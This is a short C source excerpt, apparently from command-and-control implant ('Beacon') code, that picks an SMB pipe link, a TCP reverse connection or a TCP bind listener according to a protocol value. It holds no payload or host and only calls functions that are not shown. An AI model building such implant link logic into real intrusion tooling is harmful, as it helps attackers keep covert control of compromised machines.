#include "beacon_link_common.h"

	/* kick off the SMB Beacon code */
	if (proto == BEACON_PROTO_SMB)
		command_link_wait();
	else if (proto == BEACON_PROTO_TCP_REVERSE)
		command_tcp_reverse_start();
	else if (proto == BEACON_PROTO_TCP_BIND)
		command_tcp_bind_start();
}